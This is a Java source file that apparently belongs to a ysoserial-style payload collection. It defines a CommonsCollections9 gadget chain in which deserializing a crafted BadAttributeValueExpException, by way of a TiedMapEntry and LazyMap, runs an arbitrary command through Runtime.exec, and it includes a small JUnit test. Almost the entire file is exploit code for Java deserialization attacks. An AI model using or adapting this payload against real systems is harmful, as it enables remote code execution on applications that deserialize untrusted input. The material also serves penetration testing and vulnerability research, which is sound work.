package ysoserial.payloads;

import org.apache.commons.collections.Factory;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.junit.jupiter.api.Test;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.io.IOException;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:3.1"})
public class CommonsCollections9 extends PayloadRunner implements ObjectPayload<Serializable> {

    @Override
    public BadAttributeValueExpException getObject(String command) throws Exception {
        final String[] execArgs = new String[]{command};
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, new NewFactory(execArgs));

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
        valfield.set(val, entry);

        return val;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections9.class, args);
    }

    @Test
    public void test() throws Exception {
        final Map innerMap = new HashMap();
        Factory factory = new Factory() {
            @Override
            public Object create() {
                System.out.println("反序列化成功");
                return "123";
            }
        };
        final Map lazyMap = LazyMap.decorate(innerMap, factory);
        System.out.println(lazyMap.get("123"));
    }

    public class NewFactory implements Factory, Serializable {
        private final String[] execArgs;

        public NewFactory(String[] execArgs) {
            this.execArgs = execArgs;
        }

        @Override
        public Object create() {
            System.out.println(execArgs);
            try {
                Runtime.getRuntime().exec(execArgs);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            return null;
        }
    }
}
